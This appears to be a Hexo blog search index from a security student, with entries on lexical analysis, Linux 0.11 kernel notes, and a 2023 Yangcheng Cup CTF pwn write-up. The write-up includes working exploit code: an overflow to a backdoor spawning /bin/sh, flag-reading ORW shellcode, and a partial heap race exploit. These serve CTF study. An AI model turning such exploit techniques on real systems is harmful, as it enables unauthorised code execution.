<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于</title>
      <link href="/2023/10/13/About/"/>
      <url>/2023/10/13/About/</url>
      
        <content type="html"><![CDATA[<h2 id="关于现状"><a href="#关于现状" class="headerlink" title="关于现状"></a>关于现状</h2><p>北京邮电大学网络空间安全专业大二在读<br>天璇Merak Pwn手<br>对二进制安全感兴趣,目前还在计算机基础学习中…</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>以后的工作可能是车联网,内核,虚拟化的安全或者开发吧(太菜没人要去送外卖也是有可能的…)<br>渗透方面的东西也是想学的</p><h2 id="关于爱好"><a href="#关于爱好" class="headerlink" title="关于爱好"></a>关于爱好</h2><p>maybe 音乐,散步,发呆,看世界.</p><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>QQ: 811614792<br>邮箱: <a href="mailto:811614792@qq.com">811614792@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>词法分析</title>
      <link href="/2023/10/13/Lexical-Analysis/"/>
      <url>/2023/10/13/Lexical-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="词法分析-1"><a href="#词法分析-1" class="headerlink" title="词法分析"></a>词法分析</h3><p>词法分析是编译的第一阶段.词法分析主要任务是读入输入字符,产生记号(token)序列,提交给语法分析使用.<br>由于这种交互模式,词法分析器可以作为语法分析器的子程序或协作程序.语法分析器每次调用词法分析器持续读入字符,直到识别出下一个记号.</p><p>词法分析除了产生记号,也收集记号相关的信息作为记号的属性(比如数字的值,标识符对应的字符串).记号影响语法分析,记号的属性影响记号的翻译.属性一般存储在符号表中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121650256.png"></p><span id="more"></span><h3 id="记号、模式、词素"><a href="#记号、模式、词素" class="headerlink" title="记号、模式、词素"></a>记号、模式、词素</h3><p>词素是源程序的字符序列</p><p>模式是描述源程序中表示特定记号的词素集合的规则.</p><p>每个符合某模式的词素经词法分析后产生对应的记号.</p><h3 id="记号的描述"><a href="#记号的描述" class="headerlink" title="记号的描述"></a>记号的描述</h3><p>字母表: 有限符号的集合<br>语言是给定字母表上任意字符串的集合.</p><h4 id="正规表达式-Regular-Expressions"><a href="#正规表达式-Regular-Expressions" class="headerlink" title="正规表达式 Regular Expressions"></a>正规表达式 Regular Expressions</h4><p>正规表达式表示的语言叫做正规集.</p><h5 id="非正规集"><a href="#非正规集" class="headerlink" title="非正规集"></a>非正规集</h5><p>正规表达式描述能力有限,其不能描述均衡或嵌套结构,如具有配对括号的符号串集合.<br>正规表达式只能表示固定次数的重复或给定结构的没有指定次数的重复.</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>接下来我们要完成对一个给定的正规表达式r的识别器的构造.</p><h3 id="有穷自动机"><a href="#有穷自动机" class="headerlink" title="有穷自动机"></a>有穷自动机</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>语言的识别器是一个程序,它以字符串x作为输入,输出true(接受)或false来表示x是否是语言的句子.</p><p>不确定的有穷自动机(NFA):<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121724289.png"><br>NFA可以由带标记的有向图(状态转换图),转换表表示.<br>F(T,a)=S:在T状态时,如果当前输入字符是a,可以转换到S状态(对于NFA来说,这里的S可能是一个状态集合)<br>当且仅当对应的转换图中存在从开始状态到某个接受状态的路径,使得该路径的便上的标记恰好连成字符串x时,NFA接受字符串x.</p><p>确定的有穷自动机(DFA)是特殊的NFA:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121725005.png"><br>也就是对于当前正在识别的字符a,当前状态有唯一的转换,这非常适合计算机的模拟.</p><h4 id="模拟DFA"><a href="#模拟DFA" class="headerlink" title="模拟DFA"></a>模拟DFA</h4><p>算法: 持续读入字符并根据当前输入字符进行状态转换(“对于当前正在识别的字符a,当前状态有唯一的转换”),当输入结束,检查当前状态是否为一个接受状态.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121735931.png"></p><p>有了DFA的模拟算法,现在只需要构造r的DFA表示.</p><h4 id="从正规表达式到NFA"><a href="#从正规表达式到NFA" class="headerlink" title="从正规表达式到NFA"></a>从正规表达式到NFA</h4><p>然而更容易的方式是从正规表达式r先构造出一个NFA.</p><h5 id="Thompson构造法"><a href="#Thompson构造法" class="headerlink" title="Thompson构造法"></a>Thompson构造法</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121745954.png"></p><p>对于字符表中的每个符号a(包括ε),构造一个如下的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121750561.png"></p><p>接下来要做的便是根据正规表达式r来”组合”之前产生的NFA.<br>实际就是改变之前各NFA初始状态和接受状态,并增加一些结点和有向边,从而”组合”成r的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121758670.png"></p><p>这样产生的NFA有以下的性质:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121802370.png"></p><h4 id="从NFA到DFA"><a href="#从NFA到DFA" class="headerlink" title="从NFA到DFA"></a>从NFA到DFA</h4><p>其实就是消除ε转换(目标1)和对同一输入符号的多种转换(目标2).</p><h5 id="子集构造算法"><a href="#子集构造算法" class="headerlink" title="子集构造算法"></a>子集构造算法</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820731.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121821896.png"></p><p>分析一下这个算法是怎么实现这两个目标的.</p><p>通过ε-closure()来合并只通过ε转换可以达到的状态为一个状态集,这个状态集是该算法操作的基本单位(目标1).<br>对于某个状态T对某个特定字符a的一种或多种(对于转换的结果而言)转换关系F(T,a),产生一个新的状态(这个状态是NFA中F(T,a)的所有输出状态的集合).之后再根据该状态集合里的每个状态在NFA中的转换关系得到状态集合之间的转换关系(目标2).</p><p>其实,两个目标都是通过将状态合并为状态集合的方式来实现的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820231.png"></p><h4 id="NFA的双堆栈模拟"><a href="#NFA的双堆栈模拟" class="headerlink" title="NFA的双堆栈模拟"></a>NFA的双堆栈模拟</h4><p>至此我们已经完成了对正规表达式r的识别器的构造.而实际上,NFA也是可以直接模拟的.</p><h5 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h5><p>回想一下我们是怎么实现NFA到DFA转换的那两个目标,可以发现该模拟算法实质上是在运行中构造DFA.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121839249.png"></p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><p>我们要实现的结构有两个,当前状态集合,要转换到的状态集合.注意这里与DFA模拟时不同,DFA中状态集合是实现为一个新的状态,有状态集合之间独立的转换关系(新的转换表),而模拟NFA时我们只具有单个状态之间的转换关系.</p><p>这两个结构可以以两个栈的形式实现.一个栈表示当前状态集合,一个栈表示要转换到的状态集合.压入所有在ε-closure(当前状态)的输出状态.转换时遍历当前状态集合的每一个状态并进行状态转换,压入结果到另一个栈中.清空当前状态集合,两个栈交换身份.</p><h4 id="最长词素匹配"><a href="#最长词素匹配" class="headerlink" title="最长词素匹配"></a>最长词素匹配</h4><p>常见有如下的实现:如果有多个模式匹配成功,选择最长词素匹配的模式.<br>当当前状态集合中含有接受状态时,记录当前输入指针的位置和该接受状态后继续识别,直到NFA进入终止(无法状态转换或输入结束),恢复到最近一次保存的输入指针位置,以该接受状态为结果.</p><h4 id="基于DFA的模式匹配器的优化"><a href="#基于DFA的模式匹配器的优化" class="headerlink" title="基于DFA的模式匹配器的优化"></a>基于DFA的模式匹配器的优化</h4><h5 id="NFA的重要状态"><a href="#NFA的重要状态" class="headerlink" title="NFA的重要状态"></a>NFA的重要状态</h5><p>如果一个NFA的状态有一个标记为非ε的出边,那么该状态为重要状态.<br>如果两个子集的重要状态相同且两者同时包含或不包含NFA的接受状态,那么这两个子集可被认为是等同的.</p><blockquote><p>The constructed NFA has only one accepting state, but this state, having<br>no out-transitions, is not an imp ortant state. By concatenating a unique right<br>endmarker # to a regular expression r , we give the accepting state for r a<br>transition on #, making it an imp ortant state of the NFA for (r )#. In other<br>words, by using the augmented regular expression (r )#, we can forget ab out<br>accepting states as the subset construction pro ceeds; when the construction is<br>complete, any state with a transition on # must b e an accepting state.</p></blockquote><h5 id="Functions-Computed-From-the-Syntax-Tree"><a href="#Functions-Computed-From-the-Syntax-Tree" class="headerlink" title="Functions Computed From the Syntax Tree"></a>Functions Computed From the Syntax Tree</h5><h6 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h6><p>为了直接从正规表达式r构造DFA,需要从语法树中计算这四个函数.Each de nition refers to the syntax tree for a particular<br>augmented regular expression (r )#</p><p>直白点说,nullable就是该位置代表的字符串是否可以为空(ε).<br>firstpos就是该节点所代表的字符串可能的开始位置集合.<br>lastpos就是该节点所代表的字符串可能的结束位置集合.<br>followpos就是可能的紧跟着该位置的位置集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309087.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309685.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122312703.png"></p><p>最后我们需要的其实只有follow集,根据求出的follow集可以得到这样一个没有ε的NFA<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131045245.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131044965.png"></p><h6 id="TO-DFA"><a href="#TO-DFA" class="headerlink" title="TO DFA"></a>TO DFA</h6><p>其实感觉和之前的思想是差不多的,状态-&gt;状态集合.<br>使用根节点的first集合并初始状态,以是否有#转换来合并接受状态.其他状态由followpos来合并.<br>差别就在于之前是通过NFA的转换关系来合并的,这里是直接通过计算follow集来合并的(其实感觉是一回事).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046225.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046738.png"></p><h5 id="最小化DFA的状态数"><a href="#最小化DFA的状态数" class="headerlink" title="最小化DFA的状态数"></a>最小化DFA的状态数</h5><p>每一个正规集都可以由一个状态最少的DFA识别,这个DFA是唯一的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120540.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120171.png"></p><h5 id="表压缩算法"><a href="#表压缩算法" class="headerlink" title="表压缩算法"></a>表压缩算法</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134804.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134760.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lexical-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核设计的艺术 阅读笔记</title>
      <link href="/2023/10/04/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/"/>
      <url>/2023/10/04/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/</url>
      
        <content type="html"><![CDATA[<p>Linux0.11内核.正文部分记录过程,引用部分记录知识点和理解.</p><span id="more"></span><h1 id="main函数之前的功能"><a href="#main函数之前的功能" class="headerlink" title="main函数之前的功能"></a>main函数之前的功能</h1><h2 id="加载操作系统"><a href="#加载操作系统" class="headerlink" title="加载操作系统"></a>加载操作系统</h2><p>经典流程:<br>计算机加电设置cs:ip为0xffff0,运行ROM中的BIOS,BIOS初始化中断向量表和一些硬件设备,加载0盘0道1扇区的引导程序bootsect到0x7c00处.bootsect是与操作系统配套的,规划物理内存,加载操作系统,设置根设备为软盘.</p><blockquote><p>Linux0.11要求系统必须存在一个根文件系统,其他文件系统挂接其上.因此Linux的启动需要两部分数据,即系统内核镜像和根文件系统.(kernel pwn中的bzimage和文件系统(比如busybox提供的))</p></blockquote><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>关闭中断.设置和全局描述符表(GDT),打开A20gate实现32位寻址(实模式下寻址范围为低1MB).CR0PE标志置1,enable 保护模式,GDT启用,段基址寄存器以选择子形式使用.</p><p>设置段寄存器以适应保护模式,建立内核页目录表,建立中断描述符表(IDT),开启分页模式.以ret模式进入main函数.</p><h1 id="环境设备初始化及激活进程0"><a href="#环境设备初始化及激活进程0" class="headerlink" title="环境设备初始化及激活进程0"></a>环境设备初始化及激活进程0</h1><p>初始化根设备和硬盘.设置缓冲区.</p><blockquote><p>除内核代码及其数据所占物理空间之外,其余物理内存主要分为3部分,主内存区(进程代码运行的空间),缓冲区(主机与外设进行数据交互的中转站),虚拟盘(可以缓存外设的数据,提高效率).</p></blockquote><p>建立内存管理基址mmu,将中断异常与IDT挂接(其实这里才是建立中断描述符表吧).开启部分中断.</p><p>初始化块设备请求项结构</p><blockquote><p>Linux0.11将外设分为两类:<br>块设备:将存储空间等分为若干同样大小的小存储空间块,每个块有块号,可以独立,随机读写,如硬盘,软盘.<br>字符设备:以字符为单位进行IO通信,如键盘,命令行显示器.</p></blockquote><p>进程想与块设备沟通,必须经过主机内存中的缓冲区.请求项管理结构就是管理缓冲区中缓冲块与块设备上逻辑块之间读写关系的数据结构.是以一个数组,同时也维护一个请求链表.</p><p>挂接交互界面相关外设的中断服务例程.如串行口,显示器,键盘.</p><p>初始化进程0,设置task_struct,使进程0具有处理系统调用的能力,设置时钟中断做好进程切换的准备工作.</p><p>最后以iret(唯一的从高权限到低权限的方式)的方式切换到3特权级,之前运行的内核控制流正式成为进程0.</p><h1 id="进程1的创建及执行"><a href="#进程1的创建及执行" class="headerlink" title="进程1的创建及执行"></a>进程1的创建及执行</h1><p>进程0通过fork创建进程1,设置相关数据结构,切换到进程1.</p><blockquote><p>通常有以下两种情况可以产生进程切换:</p><ol><li>允许进程运行的时间结束.每个进程在创建时都被赋予了有限的时间片,当时间片减少到0便发生进程切换.</li><li>进程的运行停止.比如等待外设的数据,等待其他程序运行的结果,进程主动停止一段时间或进程执行完毕等等.</li></ol></blockquote><p>进程1安装硬盘文件系统.格式化虚拟盘(使其具有文件系统相关内容,引导块,超级块,格式化之后虚拟盘正式成为一个块设备)并更换根设备为虚拟盘.</p><blockquote><p>操作系统中的文件系统可以大致分为两部分,一部分在操作系统内核中,另一部分在硬盘,软盘,虚拟盘中.<br>文件系统用inode(i结点)来管理文件,一个inode管理一个文件.文件的路径在操作系统中由目录文件中的目录项管理,一个目录项对应一级路径,目录文件也是文件,也由一个inode管理.一个目录文件挂在另一个目录文件的目录项上,就成了父子目录的关系.所有的文件最终挂接成一个树形结构,树根i节点就叫这个文件系统的根i节点.一个逻辑设备(一个物理设备可分成多个逻辑设备)只能包含一个这样的树形结构.</p></blockquote><blockquote><p>加载文件系统最重要的标志,就是把一个逻辑设备上的文件系统的根i节点,关联到另一个文件系统的i节点,也就是常说的mount.可以联系一下之前容器中bind mount的操作.</p></blockquote><blockquote><p>一个文件系统必须挂接在另一个文件系统上,必然就存在一个根文件系统,Linux0.11中的super_block[8]中保存的根设备的超级块对应的文件系统便是根文件系统.</p></blockquote><h1 id="进程2的创建及执行"><a href="#进程2的创建及执行" class="headerlink" title="进程2的创建及执行"></a>进程2的创建及执行</h1><p>加载完根文件系统之后,进程1(其实是kernel)具备了对设备文件的访问能力.使用open和dup打开/dev/tty0文件作为标准输入,输出,错误文件.</p><p>进程1创建进程2并切换到进程2.进程2关闭标准输入重新以/etc/rc为标准输入,execve运行/bin/sh的shell程序.相当于shell的初始化,执行/etc/rc里的预置命令,比如创建进程并加载/etc/update程序</p><blockquote><p>update进程将缓冲区中的数据同步到外设.该程序每隔一段时间就会被唤醒,完成同步工作后挂起等待下一次唤醒.</p></blockquote><p>update进程挂起后控制流回到进程2,进程2完成善后工作后退出.</p><p>进程1继续执行,以/dev/tty0为标准输入重建shell.shell在等待输入后挂起,当接收到键盘中断,shell进程从字符缓冲队列(其实就是tty0的内容)读取指令数据,并完成相应操作.</p><p>至此系统进入怠速状态.</p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><blockquote><p>安装文件系统就是在根文件系统的基础上,把硬盘中的文件系统安装在根文件系统上,使操作系统也具备<code>以文件形式与硬盘进行数据交互的能力</code>.</p></blockquote><blockquote><p>安装文件系统分三步:<br>1)将硬盘的超级块读取出来并载入super_block[8].<br>2)将虚拟盘上指定的i节点读出,加载到系统的inode_table[32]中.<br>(<del>是不是意味着最多只能挂载8个文件系统(设备),挂载点最多32个?</del>)<br>3) 将硬盘上的超级块挂接到指定的i节点上.</p></blockquote><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h2 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h2><blockquote><p>操作系统在内存中为每个管道开辟一页内存,为这一页内存赋予文件的属性,这一页内存由两个进程共享,但不会分配给任何进程,只由内核掌控.</p></blockquote><blockquote><p>从技术上看,管道就是一页内存.<br>1)文件属性:创建管道相当于创建(并打开)一个文件,进程对管道的访问形式与访问文件相同.<br>2)减少页属性:该页不映射到进程的地址空间内.无法被进程以内存形式访问.</p></blockquote><h2 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h2><blockquote><p>发送信号:<br>1)进程通过调用特定的库函数给另一个进程发送信号,另一种方式是用户通过键盘输入信息产生键盘中断后,中断服务例程给进程发送信号.发送信号的实质是设置信号位图上的信号位.(这也是为何未处理的相同信号会丢失的原因)</p></blockquote><blockquote><p>系统检测进程接收到的信号:<br>进程并不能检测收到的信号,该工作由内核完成.</p><ol><li>在系统调用返回之前检测当前进程是否接收到信号.</li><li>时钟中断产生后,其中断处理例程执行结束之前检测.</li></ol></blockquote><blockquote><p>处理信号.当用户程序不需要处理信号时,信号处理函数完全不参与用户进程的执行,当用户进程需要处理信号时,进程的程序将暂时停止执行,转而去执行信号处理函数,执行完毕后将从暂停的现场继续执行.</p></blockquote><p>这里处理信号的方式挺有意思的,解决了我看CSAPP时的一个疑问.</p><blockquote><p>在系统调用返回前或时钟中断返回前,先把内核栈中保存的寄存器备份在当前进程的<code>用户栈</code>中,修改内核栈中的寄存器使得iret之后跳转到用户空间的信号处理函数.处理完成后,再通过前面备份在用户空间的指令和数据,返回用户空间执行.</p></blockquote><p>这里又有一个问题,既然已经回到用户态了,那即使在用户栈上布置的暂停现场的状态,也无法通过ret指令完成状态(如edi等寄存器)的恢复.原来在信号处理函数完成后,从栈上弹出的返回地址是一个restorer函数的地址,它将完成用户进程状态的恢复并再次ret到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2023 复现</title>
      <link href="/2023/10/01/ycb2023/"/>
      <url>/2023/10/01/ycb2023/</url>
      
        <content type="html"><![CDATA[<p>heap没出没进线下…</p><span id="more"></span><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>qemu-riscv64 -g 2333 ./pwn<br>gdbinit这样设置方便调试,然后gdb-multiarch -x gdbinit就能调了</p><pre class=" language-gdb"><code class="language-gdb">set arch riscv:rv64target remote 127.0.0.1:2333define hook-stop    info reg    echo "\n\n\n\n\n"    x/10i $pcendb *0x123457EAc</code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281240372.png"></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>main函数,一次向unk_12347078读入8字节,一次向栈上读入最多0x120字节,没有溢出.之后跳转到sub_12345786函数,即vuln.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281230369.png"><br>vuln函数:<br>调用strlen函数检查之前在main函数中第二次输入的数据长度是否小于8,这里有个andi a4,a5,0xFF的操作,即只取了strlen结果的低8位,则0x108被转换成0x8,完成绕过.而返回地址恰好存储在strcpy(dest,source)的dest+0x100的地方,正好可以覆盖.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281229972.png"><br>还有个后门函数不过有过滤,可以直接跳到这个位置绕过过滤.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281239787.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token number">0x100</span>backdoor <span class="token operator">=</span> <span class="token number">0x12345770</span>payload <span class="token operator">=</span> b<span class="token string">"a"</span><span class="token operator">*</span>offset <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>b<span class="token string">'name:'</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>b<span class="token string">'words'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>有个offbynull,第17个字节没有限制可以输入ret的字节码.<br>第一次输入时输入syscall的字节码,第二次输入shellcode利用栈上数据布置read的参数.第三次正式读入orw的shellcode,dup2改一下fd.<br>偷搬wp.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sa<span class="token punctuation">(</span>b<span class="token string">'[2] Input: (ye / no)\n'</span><span class="token punctuation">,</span> b<span class="token string">'\x0f\x05'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># syscall</span>sc <span class="token operator">=</span> <span class="token triple-quoted-string string">'''push raxpop rsipush rbx pop raxpush rbxpop rdipush rbppop rsppop rdxpop rdxpop rdxpop rbxpop rbxpop rbxpush rdxpush rspret'''</span>shellcode<span class="token operator">=</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>sa<span class="token punctuation">(</span>b<span class="token string">'======== Input Your P0P Code ========'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>sc <span class="token operator">=</span> <span class="token triple-quoted-string string">'''push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi, 1mov rsi, 0x200000000mov rax, 0x21syscallmov rdi, 3mov rsi, 2mov rax, 0x21syscallmov rdi,2mov rsi,rsppush 90pop rdxxor eax,eaxsyscallmov rdi, 0x200000000mov rsi,rsppush 1pop raxsyscall'''</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x48</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> b<span class="token string">'a'</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>大概逻辑是主函数读取输入,根据输入开启单独线程进行相应的堆操作.<br>注意下输入的格式.</p><p>看了很久没找到洞.由于处理输入是在单独的线程中,考虑过条件竞争,但否定了,当时的理由是:<br>    “开启一个线程1后,线程1开始简单逻辑,主线程回到fgets阻塞等待IO,待结束阻塞后才开启线程2,由于IO操作,程序正常运行情况下线程2一定是在线程1完成逻辑并结束后再开启的,不会存在竞争现象.”</p><p>看了其他师傅的wp才发现edit函数中有个sleep(1)….ok那就竞争吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291610316.png"><br>相关调试命令</p><pre><code>cmd = '''set scheduler-locking onbreakrva 0x1955cbreakrva 0x14f8c'''</code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>既然edit会sleep(1),那就在edit等待的时候替换掉全局变量里的堆块指针,指向一个更小的chunk,在本题中便可制造一个0x18字节的堆溢出.glibc2.35的0x18字节堆溢出,想想都麻烦,不过好在这题的特殊结构,可以覆盖content_ptr制造一个任意地址读写.<br>好在main函数能正常退出,可以直接改返回地址了.<br>发现libc只是partial relro,可以改下got表,我exp是直接改onegadget了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291616663.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309301605803.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>具体有点麻烦的,多调调吧,主要就是memncpy会用\0填满n字节,然后我们又要用一次部分覆写…<br>这libc的environ末尾还是00…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291936629.png"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span>bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'1 '</span>    payload <span class="token operator">+=</span> content    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'2 '</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'3 '</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">':'</span><span class="token operator">+</span>content    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'4 '</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'5 '</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> b<span class="token string">'/bin/sh\x00'</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x62</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>b<span class="token string">'\xa0\x08'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'paper index: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x198db0</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token 